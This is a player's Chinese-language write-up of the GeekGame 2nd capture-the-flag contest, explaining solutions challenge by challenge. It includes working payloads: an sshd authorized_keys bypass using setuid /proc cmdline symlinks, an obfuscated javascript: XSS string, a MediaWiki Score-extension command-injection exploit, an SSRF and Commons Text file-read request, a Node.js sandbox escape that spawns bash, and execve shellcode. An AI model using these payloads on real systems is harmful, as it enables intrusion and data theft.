# GeekGame 2nd Writeup by zzh

## 前言

去年的 [writeup](https://github.com/PKU-GeekGame/geekgame-1st/tree/master/writeups/players/%E6%AC%A2%E8%BF%8E%E5%8F%82%E5%8A%A0%E6%98%8E%E5%B9%B4%E5%8D%81%E6%9C%88%E4%BB%BD%E4%B8%AD%E7%A7%91%E5%A4%A7%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E8%B5%9B) 我写了 10 个小时，今年不想写这么久了。所以对于解法没什么创意的题目我就不细讲了，也不打算放很多截图了，想看细节的话大家可以移步官方和其他选手的 writeup。

这次比赛我一共花费了大约两个整天和两个半天。题目很有趣，整体上质量也挺高的，不过也有一些不足之处。关于不足之处我会在最后专门讲一下。

以下题解的代码中有的可能不完整，因为我是从 Jupyter Notebook 复制的，但核心逻辑都在。

## †签到†

点开，复制，发现要竖着读才是 flag。打开 [CyberChef](https://gchq.github.io/CyberChef/)，添加一个 Rail Fence Cipher Decode，粘贴，得到 flag。（手工恢复也行，但是我懒。）

看到第二阶段提示我才知道这个 pdf 是不允许复制的，我用 Chrome 自带的 pdf 阅读器打开试了一下果然不让复制。我因为在 Chrome 里安装了沙拉查词插件，pdf 会用这个插件打开，所以正好绕过了这个问题。（顺便推荐一下这个插件，我用它在网页上和 pdf 里面查单词。）

## 小北问答 · 极速版

用 pwntools 交互。

- HTTP 头：`curl -v` 试一下就知道了。

- gStore：直接搜索，找到年份比较早的那个。

- BV 号：能搜到网页上的转换工具。

- 安卓包名：解压之后随便翻一翻，看起来像包名的东西就是。

- 电子游戏概论：去年比赛 GitHub 仓库里面源代码里有，每次连接会变化。

- 质数：随便选一个提交，用 `sympy.nextprime`，每次连接会变化。

- Firefox WebP：直接搜索就能找到。

就差一个邮编，我试了几个从 MAC 地址查定位的工具，很多都查不到，有个工具显示苹果的数据库返回的经纬度，看了一下在欧洲，比较奇怪。所以多试几次刷出来没有这道题的情况就行了。

## 编原译理习题课

前两问用宏展开就行。

```c++
#define a b b
#define b c c
#define c d d
#define d e e
#define e f f
#define f g g
#define g h h
#define h i i
#define i j j
#define j k k
#define k l l
#define l m m
#define m n n
#define n o o
#define o p p
#define p q q
#define q z z
#define z "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"

int main() {
    char *x = a;
}

//EOF
```

```c++
#define a b b
#define b c c
#define c d d
#define d e e
#define e f f
#define f g g
#define g h h
#define h i i
#define i j j
#define j k k
#define k l l
#define l m m
#define m n n
#define n o o
#define o p p
#define p q q
#define q z z
#define z char *x=1;

int main() {
    a
}

//EOF
```

最后一问要把编译器搞崩溃。我试了一下通过搞一堆 template 爆内存的方式产生的错误信息跟题目要求的不太一样，看来要真的 segfault 才行。我在[这里](https://codegolf.stackexchange.com/questions/7197/crash-your-favorite-compiler)试了一大堆，没一个能用的。

最后在 Google 搜索「test g++ crash」得到[第一个搜索结果](https://gcc.gnu.org/bugzilla/show_bug.cgi?id=54080)，就可以用。

## Flag Checker

Java 逆向题，我之前用过 JD-GUI 所以用它来逆向，很容易做出来第一问。

但是 JD-GUI 显示第二问的字符串会乱码，也不让复制，于是我随便找了个在线的反编译工具。把文件提交上去，显示出来了字符串内容。解码之后是一段 js 代码，也很容易做出来，这里就不细讲了。

## 智慧检测器

花了很多时间读地图生成部分的代码，后来证明这部分不用理解也能做题。我还看了所谓 D 比赛上的原题，也没找到什么线索。

后来仔细审计代码，发现一次输入多个字母的时候，每次循环的时候并没有把 `CurPos` 复制为一个新对象给 `NewPos`，而是指向了同一个对象，所以即使输入的字母是不能走的，也会移动 `CurPos`。

那这样就简单了，比如输入 `NU` 这种组合，只要 `N` 能成功，就可以趁机上一层。层数（z 坐标）超出范围会产生异常。

第二问解法中前两关很容易过。第三关的话，在没有到达顶层的时候，发送类似 `NU` 这样的命令，第一个字母根据起始位置和当前位置决定，尽量往起始位置的对面走。到达顶层之后往 `E` 走就行。多试几次就能跑出来 flag。

第二阶段提示说可以用 `R` 重新开始，其实并不需要。

## 我用108天录了个音（部分解出）

生成一个能被正确识别的音频并不难，我是用 TTS 合成的语音然后在音频编辑软件里面调整一下时间。

第一问要求两个条件满足其一。把文件搞得比较小想想就比较麻烦，另一个条件是让音频小于 30 秒，但是按照题意，五句话至少也要 40 秒啊。所以第一想法就是改文件的 metadata 来骗过识别的程序。

我看了一下这个时间是怎么识别的，看起来 format 参数是根据文件扩展名来决定的，我就想到，能不能直接改扩展名来做到？然后我随便试了几个组合，发现 ogg 文件重命名成 aac，就可以检测出来一个小于 30 秒的长度。具体原理我也不清楚。提交语音识别，报了一个 `[TencentCloudSDKException] code:InvalidParameterValue.ErrorInvalidVoicedata message:Invalid audio file!` 错误，我就以为这样搞是不行的。然后我原样重新提交了一次，这次竟然正确识别了！我真是服了这个腾讯云 API，如果仅仅是每次模型识别结果有些偏差还可以理解，但是连音频文件解码的逻辑都会每次不一样，这我就无法理解了。

然后是第二问（没做出来）。我试了那几个有损压缩格式，只有 aac 格式可以压得比较小（甚至其他格式直接不允许小于 8000 的码率），所以我就一直在尝试压缩 aac 格式。每段分别压制然后再用 ffmpeg [连接](https://stackoverflow.com/questions/36395428/how-to-concatenate-two-aac-files-with-the-ffmpeg)起来。其中空白的声音也是用 ffmpeg [生成](https://stackoverflow.com/questions/12368151/adding-silent-audio-in-ffmpeg)的。

我尝试了 ffmpeg 的不同版本、fdk-aac、苹果的编码器（网上说苹果的商业版本比开源的编码器质量好不少），每个软件都使用不同的参数组合尝试，还 TTS 生成了以及自己录制了很多个版本的语音，也变换了不同的语速，发现最好也就能压到 11~12 KB 这样，没法到 8 KB 以下。一旦压到 8 KB 以下，识别结果就是一堆错字。

第二阶段提示放出后，我把 12 KB 以下的文件尝试提交，发现 aac 文件使用改扩展名的方法无法让腾讯云正常识别了，我就不知道怎么办了。我看了看 aac 文件的二进制结构，也没找到怎么骗过音频长度识别。另外根据提示我还试了一些其他的 ogg 编码器，也完全搞不出来比较小的 ogg。不过我发现一个有趣的点是，ffprobe 似乎总是会显示出来一个比实际短的时间，比如实际上 45 秒的 aac 文件，ffprobe 会显示成 31 秒。这可能是一个突破点。我尝试把所有语音和空白都搞得尽可能短，看看这个数字有没有可能小于 30，结果就是在已经超出第二阶段时间间隔要求并且语速非常快到无法识别的时候，时长仍然超过 30，于是放弃。这个 ffprobe 识别错误的问题如果仔细研究研究说不定有戏，但是既然名次不会变化了就摆了。

另外说一下，对于正常做题的人来说，我觉得这个 200 次是不太够用的。

## 小Z的服务器

这题出的挺好的，是这次比赛我最喜欢的题目。

众所周知，当你的 ssh 私钥或者配置文件权限不对的时候，ssh 就会拒绝使用。这道题 guest、admin1、admin2 三个用户共享同一个家目录，但是家目录里面的文件却都是属于 guest 用户的，这时试图 ssh 到 admin1 和 admin2 用户时，sshd 会直接不认可 `authorized_keys` 之类的配置文件。这道题就是考察如何绕过这个限制。

一开始我想，这题盲猜是一个权限位的 race（或者说 TOCTOU）问题吧，毕竟这个权限检查只是一种安全加固罢了，可能实现的没多好。于是我随手写了几行 bash，先把家目录和 `.ssh` 目录改成所有人可读，然后不断死循环修改相关目录和文件的权限位，以及尝试把文件和目录都换成符号链接，并且不断更改符号链接的指向。同时，尝试 ssh，发现连不上。看来盲猜是不行的，速通失败。

于是开始正经做题，在题目给的 Docker 环境版本下用 apt 下载了 `openssh-server` 的源代码，看一下权限检查这块具体的逻辑到底是什么样的。结果发现，源代码中很好地考虑到了 race 的问题，正确地使用了打开文件后的 fd 来判断权限。判断权限的代码位置就在第二阶段提示给的链接那里，会要求以下条件都满足：

- owner 必须是正在被登录的用户，或者是所谓的 `platform_sys_dir_uid`，后者包括 root（uid = 0）和另一个编译时指定的 uid（应该是 2，我没去研究 ubuntu 是怎么指定的）。
- 文件的权限位中 others 必须不可写，group 必须不可写，或者可写但是 group 中只有这一个用户。
- 文件所在的目录树，一层一层找上去，直到家目录，必须也满足某些权限要求。

另外，通过阅读代码，看起来在没有密码的情况下，应该只有 `authorized_keys` 和 `authorized_keys2` 可以用来作为登录凭据，还有个 `rhosts` 或者 `shosts` 文件，但是默认配置下没有启用。

对于第一点，我们知道，Linux 上没有 root 是[不能把自己的文件改成别人的](https://unix.stackexchange.com/questions/27350/why-cant-a-normal-user-chown-a-file)，甚至通过 FUSE 也没法挂载出来 owner 是别人的文件。没有 root 应该也是无法操作 group 相关的信息。至于找到 owner 是 admin1 或者 admin2 的文件，可以用 find 命令找一下，整个文件系统里应该只有 `/flag1` 和 `/flag2` 满足。

那能不能把 `authorized_keys` 搞成 `/flag1` 的符号链接来试试呢？试了一下，并没有什么卵用。

看来唯一的方法就是找到一个文件，它的 owner 是 root，并且其他人不可写，然后我们还能控制里面的内容了。

我最先想到的是 `/etc/passwd` 这个文件，它的 owner 是 root，并且普通用户可以修改它的部分内容，比如你的 shell。但是我认真研究了一下 `authorized_keys` 的解析逻辑，发现通过修改 `/etc/passwd` 中我能控制的部分应该搞不出来能被正常解析的公钥格式。

接下来我想到的是 syslog，普通用户使用 logger 命令就能写进去，内容会出现在 `/var/log` 下的某个文件里面。但可惜的是题目环境是 Docker，并不支持 syslog。还有用户登录产生的 log 等其他 log，但是没找到能用的。

然后我把目光转向了 `/proc` 文件系统，比如 `/proc/pid/cmdline` 就是我们可以控制的，然后我试了一下，guest 用户运行的进程的 `/proc/pid` 下面的东西 owner 都是 guest，并不是 root。我立马就想到了 setuid 程序，尝试运行一个 setuid 程序，比如 `passwd` 命令，检查它的 `/proc/pid` 下面文件的 owner，果然是 root。看起来这条路行得通。

接下来就是怎么让 cmdline 的内容是公钥，这个很简单，Linux 进程的 `argv[0]` 是[可以随便指定的](https://stackoverflow.com/questions/3251550/how-to-change-argv0-in-bash-so-command-shows-up-with-different-name-in-ps)。

所以最终的 payload 是依次执行这些命令：

```bash
(exec -a "$(cat ~/.ssh/authorized_keys)" passwd) &
chmod 755 /home/guest && chmod 755 .ssh && rm .ssh/authorized_keys && ln -s /proc/40/cmdline .ssh/authorized_keys
ssh admin1@localhost
```

这样就可以拿到 flag1 了。

然后是第二个 flag。

admin2 用户的 shell 被改成了一个只会连接 ssh 到 nobody 用户的脚本，这样我们就没法以 admin2 用户的身份读取 flag2 了，怎么绕过这个限制？

首先我想到的是直接在 ssh 命令后面加上要执行的命令来绕过。试了一下并不行。然后我看到 `/etc/guest.sh` 里面的 ssh 命令并没有使用绝对路径，所以有可能通过 PATH 环境变量来执行我们自己的 ssh 程序。我研究了一番发现 ssh 本身并不能传递任意的环境变量，允许设置环境变量的 `PermitUserEnvironment` 选项默认也是关的。然后我研究了一下 `authorized_keys` 都能设置哪些额外的参数，发现除了不能用的环境变量外还有个 `command`，但是试了一下发现这个指定的命令似乎会用被连接用户的 shell 执行，在现在的场景下用户的 shell 就是 `/etc/guest.sh` 这个脚本，并不能做什么。

然后我把注意力转向了 ssh 客户端这边，如果 sshd 不能在 admin2 用户被连接时给我们 shell，那么 admin2 用户试图连接 nobody 的时候，有没有可能拿到 shell 呢？我们可以控制 ssh 客户端使用的 ssh config 文件，所以我开始看 `man ssh_config`。过一遍文档之后，跟我们需求相关的主要就是那几个以 `Command` 为结尾的配置项，加上一个 `Match exec` 写法。我全部研究了一遍（这里其实有问题，我稍后讲），它们通通都是使用用户的 shell 来执行命令，所以没能成功。

这时我开始尝试另一种思路，就是真的让 nobody 的 ssh 连上，然后看看连接时的转义序列能不能做到任意命令执行。转义序列就是说，在 ssh 连接的时候，按 `~` 键，然后可以做很多事情，比如关闭连接、建立新的端口映射、执行命令等等。如何让 nobody 的 ssh 连上呢？可以在 ssh config 里面指定另一个端口号，然后我们运行另一个 sshd。但是想想就比较麻烦，暂时决定先不搞，而是去读读源代码看看到底可不可行。

开 Docker，启用软件源里面的源代码，从 apt 源下载 `openssh-client` 的源代码，发现跟 server 是同一份代码……

通过阅读代码，我确认了转义序列中执行命令应该也是会使用用户的 shell，所以这条路不通。然后我就开始在源代码中搜索所有的 `system`、`exec`、`popen` 这类函数，看看到底哪一个地方才会不使用用户的 shell，顺便也搜索了一下 `/bin/bash`、`/bin/sh` 之类的字符串。

然后我发现，有个 `KnownHostsCommand`，它指定的命令不会使用用户的 shell！

所以最后的解题 payload 如下：

```bash
(exec -a "$(cat ~/.ssh/authorized_keys)" passwd) & (exec -a 'Host localhost'$'\n'"KnownHostsCommand /usr/bin/chmod 777 /flag2"$'\n' passwd) & chmod 755 /home/guest && chmod 755 .ssh && rm .ssh/authorized_keys && ln -s /proc/40/cmdline .ssh/authorized_keys && ln -s /proc/41/cmdline .ssh/config
ssh -F /dev/null admin2@localhost
```

然后就可以在 guest 用户读到 /flag2 了。

第二行指定 `-F /dev/null` 是为了让我们从 guest 连接 admin2 的时候不要使用我们构造的 ssh config，不然会报错失败。

那我读 `man ssh_config` 文档的时候为什么没有看到 `KnownHostsCommand` 呢？研究了一下是因为，我为了方便，直接看我的 Debian 11 上的文档了，不是题目的系统版本。这告诉我们，一定要使用跟题目一样的环境来测试，不要为了方便使用自己的环境。幸好我下载源代码的时候是使用的跟题目环境一样的 Docker，如果我也使用 Debian 11 上的 apt 来下载源代码的话，估计永远也不可能知道有 `KnownHostsCommand` 了。

## 企鹅文档

第一步和第二步都是在 json 里面找一找就行，这里就不细讲了。

## 给钱不要！

这题要看 Chrome 源代码，可以定位到相关代码在[这里](https://source.chromium.org/chromium/chromium/src/+/main:components/omnibox/browser/autocomplete_input.cc)。第一问要求 omnibox 必须判断输入的内容为 query 类型，第二问 query 和 unknown 都可以。

第一问是要求输入内容并点击按钮后页面的标题为某个字符串，第二问是要求读出来网页内容中的 flag。

分析源代码的逻辑，可以看出，对于 `javascript:` 开头的这种 URL，满足 `(?i)javascript:([^;=().\"]*)` 这个正则表达式的时候会返回 unknown，其他情况都会返回 url（会被判断为危险从而不会执行）。这个正则表达式过滤掉了 `;=()."` 这些符号，同时题目的代码还过滤掉了 `%`。

绕过这些限制就可以过第二问。

我在网上找了一些 XSS 绕过限制的文章，看到了[这篇文章](https://www.lzskyline.com/index.php/archives/105/)，直接用相同的方法构造就行，最终 payload 是：

```javascript
javascript:setTimeout`\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0074\u0069\u0074\u006c\u0065\u003d\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006c\u0065\u0063\u0074\u006f\u0072\u0028\u0022\u002e\u0066\u006c\u0061\u0067\u0022\u0029\u002e\u0074\u0065\u0078\u0074\u0043\u006f\u006e\u0074\u0065\u006e\u0074`
```

其中的命令是 `document.title=document.querySelector(".flag").textContent`。

然后回到第一问，可以确定，所有完整的 URL 看起来都不可能被判定为 query 类型，但是如果提交的文本不是完整的 URL，那根本不可能执行代码或者跳转到其他网站啊。

再次阅读题目代码，我发现虽然 `http://`、`https://`、`file://` 前缀会被去掉，但是输入文本框的其实是原始的文本。所以我们只要让不完整的 URL（不包含 `http://` 或者 `https://` 前缀）被判定为 query 即可。不过这样就排除了 `javascript:` 开头的可能。

在源代码中定位所有的 `OmniboxInputType::QUERY`，依次分析他们的情况，应该就能解出题目。

- 第一处在 268 行，条件是正规化之后也根本不能被解析为 URL，这种情况对于我们的场景应该是不存在的，因为不是合法 URL 的话根本不可能触发跳转。

- 第二处在 422 行，是 host 字段中包含空格，我研究了一下对于互联网的域名应该不可能做到域名包含空格，对于本地的 hostname 说不定可以，但是对解题没用。

- 第三处在 473 行，host 需要是 IP 地址，并且 IP 地址第一段是 0，这些 IP 是保留 IP，并不能访问我们控制的网站。

- 第四处在 505 行，host 需要是 IP 地址，并且 IP 地址的段数要大于 1，对于段数为 4 的 IP 地址，上面已经判断过了，所以这里只能是 2 和 3，也就是 `12.34` 或者 `12.34.56` 这种格式。

这个源代码文件中只有这四处返回 `OmniboxInputType::QUERY` 的地方。

两段或者三段的 IP 地址是什么意思呢？经过实验，可以发现，`12.34` 代表 `12.0.0.34`，`12.34.56` 代表 `12.34.0.56`。既然这样，那我们只要有一个 `x.x.0.x` 这种格式的 IP 地址，它提供的网页标题是题目要求的那个字符串，那这题不就解出来了吗？这样的 IP 地址理论上大约每 256 个就会有一个吧，应该不难找。

我从此开始误入歧途。

我开始尝试搞出来这样第三段是 0 的 IP 地址。首先我看了一下我自己现有的服务器，没有这样的地址。然后打开（刚刚申请了语音识别 API 的）腾讯云，在每个地域都申请了几十个公网 IP，一共几百个 IP，没一个第三段是 0。然后我又去阿里云，也申请了几百个 IP，同样没找到第三段是 0 的 IP，又在 Azure 的每个地域申请了很多（那个命令行工具还挺好用的），同样没找到。

人家 mcfx 连 [AS](https://whois.ipip.net/AS209661) 都有，而我却连一个 IP 都找不到。

既然自己没有这样的 IP，那蹭别人的也可以。如果有一个这样格式的 IP，他的某个 URL 支持任意重定向（Open Redirect），那不也可以吗？于是我就开始寻找这样的网站，首先想到的就是 [1.0.0.1](https://1.0.0.1/)。但是找了一大圈，还研究了 Cloudflare 的 `/cdn-cgi` 下面的各种 API，都没找到任意重定向的接口。后来想想，如果真能找到，那真是一个有趣的非预期解。

然后我又去研究了如何租用 IP 段，发现某个网站上可以租到第三段是 0 的 IP 地址段，价格也不算贵，但是注册了之后发现需要认证公司身份，不接受个人用户，就懒着继续了。如果我之前注册过公司，说不定这题就这样解出来了。

我又想能不能强行占用科大 IP 段里面的这类地址（看起来移动出口有一些），或者扫描所有这类 IP 上面的服务来寻找任意重定向，但是这些都是不太好的行为，就算了。

睡了一觉之后，我在想，有没有可能我看的最新版代码跟题目运行的版本不一样，最近有改动？我就去研究相关文件的历史修改，然后发现最近没啥有意义的修改。在看代码的时候，我突然在想，我只看了所有 `AutocompleteInput::Parse` 这个函数中返回的 `OmniboxInputType::QUERY`，那它间接调用的别的函数呢？我立马跑去看代码，发现还真有，325 行就是这样的。追踪进去看，发现[这里](https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/autocomplete/chrome_autocomplete_scheme_classifier.cc;l=90?q=OmniboxInputType::QUERY&ss=chromium%2Fchromium%2Fsrc&start=11)也可以产生 query 类型的结果。那条件是什么呢？是[这个函数](https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/external_protocol/external_protocol_handler.cc;drc=4d9f1c1280ee8474a61ff89260a81651c50b4fb6;l=322)返回 `BLOCK`，就是说你输入的文本去掉 `http://` 或者 `https://` 前缀后，按照 URL 解析出来的协议部分，需要是所有 `kDeniedSchemes` 之一或者单字母的就行。

去 `chrome://omnibox` 测试，`a:a@a.com` 就是 query 类型的，于是在自己的服务器上提供一个 title 符合要求的网页，然后提交 `http://a:a@ip/?` 就直接通过了。

后来与主办方的 xmcp 聊了一下，原来预期解法是 `1.234567` 这样的 IP 地址会被（按 256 进制）展开，得到 `1.3.148.71` 这样的地址。我在做题的过程中还真看了几篇讲各种畸形 IP 地址的文章，但是大家说的都只是十六进制、八进制、全数字之类的格式，并没有看到 xmcp 说的这种。想了想，很多年前我确实知道这种写法，但是基本都忘了。看来想知道一个东西的严格定义的时候，还是不能为了偷懒在网上随便看看别人的文章，而应该去读官方文档啊。

## 私有笔记

这个题明确说了不要看代码，根据题目里面的链接，一看就是 CVE 题，于是开始找 CVE。

根据题目环境的版本，发现相关的大概是[这里](https://www.mediawiki.org/wiki/2021-12_security_release/FAQ)的这些，然后随便试了一下各种参数组合，不知道具体是什么操作序列触发了漏洞，反正访问到 `index.php?title=%E9%A6%96%E9%A1%B5&action=mcrundo&undo=1&undoafter=2` 的时候就出现了 flag。

我在本地用 Docker 跑了一个 MediaWiki，对比发现题目环境的 Score 插件很可疑。搜索了一下发现了[这个](https://github.com/seqred-s-a/cve-2020-29007)。使用提供的用户名密码登录，试了一下 payload 能用，但是怎么读 flag 进来呢？用布尔型注入其实已经稳了，但是写起来麻烦，我就想怎么把 flag 给直接一次读回来。试了试各种 URL，都会被 `index.php` 处理，唯独图片目录不会，所以把 flag 写进图片目录就行了。

最终 payload：

```
<score>\new Staff <<{g^#
(number->string(system "cat /flag2 > /var/www/html/images/a.png"))
}>>
</score>
```

然后 `curl https://prob07-lkukvyic.geekgame.pku.edu.cn/images/a.png` 即可看到 flag。

## 企业级理解

这道题第一问我一开始一直都没搞明白 flag 在哪里……

首先拿到一份 PDF 格式的代码。可以发现 80、8079、8080 跑着三个服务，我们访问的是 80 端口的服务。然后我们发现一些 URL 被过滤掉了。通过简单的尝试可以发现 URL 中添加一个 `/` 就可以访问 `/admin/query/` 和 `/admin/source_bak/`。根据得到的代码，可以看出 80 端口的这个服务是一个类似反向代理的角色，会把 `/admin/` 后面的部分提取出来，进行 URL Decode 操作，然后作为新的 URL 访问 8079 端口的服务。我直接就试了一下如果填写的 URL 包含域名会怎么样，发现可以直接访问 8080 端口的服务，于是第二个 flag 拿到。

这是第二个 flag，那第一个 flag 应该跟 `/admin/query` 有关，但是 type 和 value 应该怎么填写呢？因为我之前试了一堆 type，试过的 type 就会进入那个列表，现在 type 已经非常多了。

过了一段时间，容器被重置了，我重新访问，发现只有 3 个 type，于是随便试了一下，用第三个 type 拿到了 flag1。

然后是 flag3，直接看[文档](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html)，本来还在想能不能用 `exexecec` 来做到删除 `exec` 后仍然有 `exec`，没想到读文件的 `file` 直接没过滤，所以最终 payload：

```python
print(requests.post('https://prob08-3k7k6fr9.geekgame.pku.edu.cn/admin/http:%252f%252flocalhost:8080%252fbonus', data={'type':'CommonsText', 'value':'${file:UTF-8:/root/flag3.txt}'}, allow_redirects=False).text)
```

## 这也能卷

第一问，`main.js` 源代码中看到这一段：

```javascript
if (localStorage.getItem('i_am_premium_user') === 'true') {
  import('./main-premium.js')
}
```

所以在浏览器控制台设置一下 localStorage 就行了。

第二问输入 flag 得到 `no geek, no flag`，很奇怪，不知道要怎么做。

然后开始研究第三问。

第三问是个 Node.js 题，执行的语句必须满足 `^([a-z0-9+\\-*/%(), ]|([0-9]+[.])+[0-9]+)+$` 这个正则表达式。`.` 的两边必须有数字，所以这让 `.` 基本没法使用了。然后也没有方括号，所以想得到对象的属性是很困难的。我们看看有哪些东西能用，在 nodejs 里面直接按一下 Tab，可以补全出来能用的名字，我把所有名字试了一遍，大部分都不是函数，所以在没有 `.` 和方括号的情况下什么都不能干。唯一的几个函数是：`atob`、`btoa`、`escape`、`unescape`、`eval`。

我又试了一下各种函数和语法：在题目环境中，`require` 和 `import` 都不让用，所以即使不限制字符集也不能引入外部的库。

我们的目标是 eval 任意的代码，所以最后必定是通过 `atob` 和 `unescape` 的结果来组合得到，因为另外两个函数 `btoa` 和 `escape` 只能得到有限字符集的东西。

我在做这道题的过程中，一直忘记了有 `%` 可以用（可能是因为同时做 XSS 那道题搞混了），硬生生把这道题做成了一道更难的题，最后得到的解法也不包含 `%`。因此，我一开始觉得 `unescape` 行不通，大部分时间就都在研究 `atob`。

我先读了一遍 js 的文档，了解了一下 js 都有哪些我不知道的语法，也看了一些常见的绕过方法，有如下发现：

- `with` 语法可以用来代替 `.`，比如 `with(a) b` 就能访问到 `a.b`。但是题目环境不让用，所以不能用来替代 `.`。

- 正则表达式，例如 `/a/` 这种写法，可以用来跟其他东西相加，就会自动转成字符串。

- 反引号的模板字符串，这题似乎没啥用。

- 语句中使用 `\u0061` 这种形式直接替换掉字母，比如 `alert` 可以写成 `\u0061lert`，但是试了一下只能替换字母，特殊字符不能这样替换。

- for 循环，比如 `for (a in process) a` 可以拿到 `process` 对象的某个 key，但拿不到 value。

```javascript
> for (a in process) a
'eventNames'
> for (a of /abc/+123) a
'3'
```

这里可以拿到循环的最后一个元素。

然后我把重点放在了将正则表达式放进 `btoa` 和 `atob` 里面来回折腾上面，在这里花了很多时间，写了很多脚本来穷举各种各样的情况，看能不能构造出来本来无法构造的字符，尤其是大写字母，全部都失败了，就去睡觉了。

第二天，我想起来，还有 `unescape` 可以用啊，只要能构造出来 `%` 就行。我仍然没有意识到 `%` 其实是允许的字符。但是通过 base64 能搞出来 `%` 吗？试了半天，还是没搞出来。然后我就想，我可以先用 `escape` 得到包含 `%` 的字符串，然后把它取出来，但是怎么取呢？for 循环只能取出来最后一个元素呀，但是 `%` 一定不是最后一个。

又过了好久，我突然意识到，其实 for 循环的过程中每个元素都会被处理一遍，虽然终端上只显示了最后一个，但其实每一个都可以被我拿到，这样只要有一个成功就行了，不过还有错误处理的问题。对于 `%` 的情况，我只需要拿到 `escape` 之后的字符串里面的第一个字符，后面报错无所谓，反正该执行的已经执行了。那 `escape` 什么字符串才能得到 `%` 呢？我试了一下，用 `escape` 处理字母和数字只能得到原样的输出，这时我突然想到了之前尝试 `atob` 时得到的各种乱码字符，那些字符 `escape` 之后肯定会有 `%`。还有一个问题，一条命令编码成可以 `unescape` 的格式之后，除了数字和百分号还有 a 到 f 的字母，这个怎么办？两层 `unescape` 就可以解决，因为这段字母对应 0x61 ~ 0x66（大写是 0x41 ~ 0x46），都是纯数字。

于是我就成功构造出来了一个不包含百分号的 payload：

```python
import requests
def submit(mode, expr):
    return requests.post('https://prob09-vfdo4i6d.geekgame.pku.edu.cn/submit', json={'mode':mode, 'expr':expr}).json()
expr = """console.log(JSON.stringify(1+1)) ;process.exit()"""
enc = lambda s:''.join([f'%{hex(ord(i))[2:].upper()}' for i in s])
expr = 'for(const p of escape(atob(11))) eval(unescape(unescape(' + enc(enc(expr)).replace('%', '+p+')[1:] + ')))'
print(submit('node', expr))
```

下一步就是任意命令执行了，我直接抄来了去年 GeekGame 的 [payload](https://github.com/PKU-GeekGame/geekgame-1st/blob/master/writeups/players/%E6%AC%A2%E8%BF%8E%E5%8F%82%E5%8A%A0%E6%98%8E%E5%B9%B4%E5%8D%81%E6%9C%88%E4%BB%BD%E4%B8%AD%E7%A7%91%E5%A4%A7%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E8%B5%9B/README.md?plain=1#L546)，不过这次我们并不能看到 stdout 和 stderr，需要管道一下。

最终 payload：

```python
import requests
def submit(mode, expr):
    return requests.post('https://prob09-vfdo4i6d.geekgame.pku.edu.cn/submit', json={'mode':mode, 'expr':expr}).json()
cmd = 'ls'
expr = """console.log(JSON.stringify(process.binding('spawn_sync').spawn({file:'bash',args:['bash','-c', '"""+cmd+"""'],stdio:[{type:'pipe',readable:true,writable:false},{type:'pipe',readable:true,writable:true},{type:'pipe',readable:true,writable:true}]}))) ;process.exit()"""
#expr = 'constructor.constructor(\'import "fs"\')();console.log(fs.readFileSync("/etc/passwd"));process.exit()'
enc = lambda s:''.join([f'%{hex(ord(i))[2:].upper()}' for i in s])
expr = 'for(const p of escape(atob(11))) eval(unescape(unescape(' + enc(enc(expr)).replace('%', '+p+')[1:] + ')))'
s = submit('node', expr)
print(bytes(s['result']['output'][1]['data']).decode())
```

能任意命令执行了，就能获得第三问和第二问的 flag 了。

原来第二问的代码长这样：

```javascript
const flag = (() => {
    const FLAG = `flag{reg3x_byp4ss_made_easy}`
    return 'no geek, no flag'
})()
```

关于 node 里面任意命令执行这件事，网上的文章都说有 `process.mainModule` 这个东西，但是我从来就没找到过它，去年也被这个问题困扰了。这是为什么呢？

## 简单题

这题想了很久，但是想出来发现很简单。

最开始想到 [movfuscator](https://github.com/xoreaxeaxeax/movfuscator) 这个东西，但是都用 mov 指令的话 syscall 怎么办呢？研究了一下这个项目是怎么搞的，没研究明白。于是自己想：能不能修改某个异常处理函数的地址到 syscall 指令的位置，然后执行非法的 mov 来触发异常处理逻辑？但是我对二进制文件这块不够熟悉，不知道该怎么搞。

又想到可以用一条指令来切换执行模式，比如换成 32 位模式甚至是其他模式，不同模式下同一串字节码可能代表不同的指令？

这时突然想到 x86 指令并不是定长的，所以其实可以 jmp 到指令中间，来执行别的指令，但是 jmp 的地址怎么写呢？mmap 的可是随机地址，不能预测。查了一下才意识到其实 jmp 的是相对的地址，并不是绝对的地址，这条路行得通，马上构造 payload。

随便找了个 shellcode，但是里面有一个特别长的 push，而 jmp 之后只有 4 个字节可以用来塞指令，所以我把它改写成了一堆 mov 和左移操作。

最终 payload：

```python
instructions = ['31c0',    '66bb97ff','48c1e310','66bbd08c','48c1e310','66bb9691','48c1e310','66bbd19d'     , '48f7db', '53', '54', '5f', '99', '52', '57', '54', '5e', 'b03b', '0f05']
code = b''
for i in instructions:
    code += bytes.fromhex('e901000000')
    code += bytes.fromhex('e9' + i + '90' * (4 - len(i) // 2))
print(code.hex())
import base64
print(base64.b64encode(code))
```

实际执行的指令：

```
0x0+2:	xor	eax, eax
0x2+4:	mov	bx, 0xff97
0x6+4:	shl	rbx, 0x10
0xa+4:	mov	bx, 0x8cd0
0xe+4:	shl	rbx, 0x10
0x12+4:	mov	bx, 0x9196
0x16+4:	shl	rbx, 0x10
0x1a+4:	mov	bx, 0x9dd1
0x1e+3:	neg	rbx
0x21+1:	push	rbx
0x22+1:	push	rsp
0x23+1:	pop	rdi
0x24+1:	cdq
0x25+1:	push	rdx
0x26+1:	push	rdi
0x27+1:	push	rsp
0x28+1:	pop	rsi
0x29+2:	mov	al, 0x3b
0x2b+2:	syscall
```

题目代码解析出来的指令：

```
0x0+5:	jmp	6
0x5+5:	jmp	0xffffffff9090c03b
0xa+5:	jmp	0x10
0xf+5:	jmp	0xffffffffff97bb7a
0x14+5:	jmp	0x1a
0x19+5:	jmp	0x10e3c166
0x1e+5:	jmp	0x24
0x23+5:	jmp	0xffffffff8cd0bb8e
0x28+5:	jmp	0x2e
0x2d+5:	jmp	0x10e3c17a
0x32+5:	jmp	0x38
0x37+5:	jmp	0xffffffff9196bba2
0x3c+5:	jmp	0x42
0x41+5:	jmp	0x10e3c18e
0x46+5:	jmp	0x4c
